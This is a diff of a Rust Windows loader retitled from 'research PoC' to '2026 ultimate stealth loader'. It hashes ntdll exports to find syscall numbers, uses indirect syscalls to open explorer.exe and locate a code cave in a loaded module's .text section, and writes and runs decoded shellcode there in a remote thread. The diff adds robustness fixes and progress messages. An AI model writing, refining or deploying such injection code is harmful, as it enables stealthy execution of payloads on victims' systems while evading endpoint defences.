@@ -10,7 +10,7 @@ use windows_sys::Win32::Foundation::*;
 
 /*
     ================================================================================
-    ULTIMATE 2026 RESEARCH PoC: ROBUST REMOTE MODULE STOMPING & INDIRECT SYSCALLS
+    2026 ULTIMATE STEALTH LOADER - PERFORMANCE & ROBUSTNESS OPTIMIZED
     ================================================================================
 */
 
@@ -125,15 +125,17 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let shellcode = general_purpose::STANDARD.decode(payload_b64)?;
 
     unsafe {
-        let ntdll = get_local_module(dbj2("ntdll.dll")).expect("ntdll resolution failed");
-        let (ssn_open, gadget) = find_ssn_and_gadget(ntdll, dbj2("NtOpenProcess")).expect("NtOpenProcess SSN failed");
-        let (ssn_read, _) = find_ssn_and_gadget(ntdll, dbj2("NtReadVirtualMemory")).expect("NtReadVirtualMemory SSN failed");
-        let (ssn_write, _) = find_ssn_and_gadget(ntdll, dbj2("NtWriteVirtualMemory")).expect("NtWriteVirtualMemory SSN failed");
-        let (ssn_protect, _) = find_ssn_and_gadget(ntdll, dbj2("NtProtectVirtualMemory")).expect("NtProtectVirtualMemory SSN failed");
-        let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("NtCreateThreadEx SSN failed");
-        let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("NtQuerySystemInformation SSN failed");
-        let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("NtQueryInformationProcess SSN failed");
+        println!("[*] Resolving ntdll and gadgets...");
+        let ntdll = get_local_module(dbj2("ntdll.dll")).expect("ntdll failed");
+        let (ssn_open, gadget) = find_ssn_and_gadget(ntdll, dbj2("NtOpenProcess")).expect("open ssn failed");
+        let (ssn_read, _) = find_ssn_and_gadget(ntdll, dbj2("NtReadVirtualMemory")).expect("read ssn failed");
+        let (ssn_write, _) = find_ssn_and_gadget(ntdll, dbj2("NtWriteVirtualMemory")).expect("write ssn failed");
+        let (ssn_protect, _) = find_ssn_and_gadget(ntdll, dbj2("NtProtectVirtualMemory")).expect("protect ssn failed");
+        let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("thread ssn failed");
+        let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("query ssn failed");
+        let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("proc ssn failed");
 
+        // 1. Find Explorer PID
         let mut buffer = vec![0u8; 1024 * 1024];
         let mut len = 0u32;
         let mut st = sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
@@ -150,15 +152,17 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             if (*info).NextEntryOffset == 0 { break; }
             offset += (*info).NextEntryOffset as usize;
         }
-        if exp_pid.is_null() { return Err("Target not found".into()); }
+        if exp_pid.is_null() { return Err("explorer.exe not found".into()); }
         println!("[+] Target found: PID {}", exp_pid as usize);
 
+        // 2. Open Explorer
         let mut h_proc: HANDLE = null_mut();
         let mut oa = OBJECT_ATTRIBUTES { Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32, RootDirectory: null_mut(), ObjectName: null_mut(), Attributes: 0, SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut() };
         let mut cid = CLIENT_ID { UniqueProcess: exp_pid, UniqueThread: null_mut() };
         st = sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
         if st != 0 || h_proc.is_null() { return Err(format!("Open failed: 0x{:x}", st).into()); }
 
+        // 3. Remote Module Cave Discovery
         let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
         sys_call(ssn_proc, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
         let mut peb_copy: PEB = std::mem::zeroed();
@@ -170,34 +174,41 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let mut cave_addr = 0usize;
         println!("[*] Searching for code cave in explorer.exe...");
 
-        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY {
+        let mut module_count = 0;
+        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY && module_count < 50 {
+            module_count += 1;
             let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();
             sys_call(ssn_read, gadget, h_proc as usize, curr_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
-            let mut n_buf = vec![0u16; (entry.BaseDllName.Length / 2) as usize];
-            sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
-            let name = String::from_utf16_lossy(&n_buf).to_lowercase();
 
-            if !name.contains("ntdll") && !name.contains("kernel") && !name.contains("gdi") && !name.contains("user32") {
-                let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
-                sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
-                let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
-                sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
-                let s_base = entry.DllBase as usize + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
-                for i in 0..nt.FileHeader.NumberOfSections {
-                    let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
-                    sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
-                    if s.Name[0] == b'.' && s.Name[1] == b't' {
-                        let start = entry.DllBase as usize + s.VirtualAddress as usize;
-                        let size = s.Misc.VirtualSize as usize;
-                        let mut t_buf = vec![0u8; size];
-                        sys_call(ssn_read, gadget, h_proc as usize, start, t_buf.as_mut_ptr() as usize, size, 0, 0, 0, 0, 0, 0, 0);
-                        let mut count = 0;
-                        for j in (0..size).rev() {
-                            if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
-                            if count >= shellcode.len() { cave_addr = start + j; break; }
+            if !entry.BaseDllName.Buffer.is_null() {
+                let mut n_buf = vec![0u16; (entry.BaseDllName.Length / 2) as usize];
+                sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
+                let name = String::from_utf16_lossy(&n_buf).to_lowercase();
+
+                if !name.contains("ntdll") && !name.contains("kernel") && !name.contains("gdi") && !name.contains("user32") {
+                    let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
+                    sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
+                    let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
+                    sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
+                    let s_base = entry.DllBase as usize + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
+                    for i in 0..nt.FileHeader.NumberOfSections {
+                        let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
+                        sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
+                        if s.Name[0] == b'.' && s.Name[1] == b't' {
+                            let start = entry.DllBase as usize + s.VirtualAddress as usize;
+                            let size = s.Misc.VirtualSize as usize;
+                            let search_len = if size > 4096 { 4096 } else { size };
+                            let search_start = start + size - search_len;
+                            let mut t_buf = vec![0u8; search_len];
+                            sys_call(ssn_read, gadget, h_proc as usize, search_start, t_buf.as_mut_ptr() as usize, search_len, 0, 0, 0, 0, 0, 0, 0);
+                            let mut count = 0;
+                            for j in (0..search_len).rev() {
+                                if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
+                                if count >= shellcode.len() { cave_addr = search_start + j; break; }
+                            }
                         }
+                        if cave_addr != 0 { break; }
                     }
-                    if cave_addr != 0 { break; }
                 }
             }
             if cave_addr != 0 { break; }
@@ -206,6 +217,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         if cave_addr == 0 { return Err("Cave failure".into()); }
         println!("[+] Found Cave: 0x{:x}", cave_addr);
 
+        // 4. Stomp & Exec
         let mut base = cave_addr as *mut c_void;
         let mut sz = shellcode.len();
         let mut old = 0u32;
@@ -216,7 +228,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let mut h_th: HANDLE = null_mut();
         st = sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
         if st == 0 && !h_th.is_null() {
-            println!("[+] Success.");
+            println!("[+] Stealth Execution successfully triggered.");
         } else {
             println!("[-] Trigger failed: 0x{:x}", st);
         }
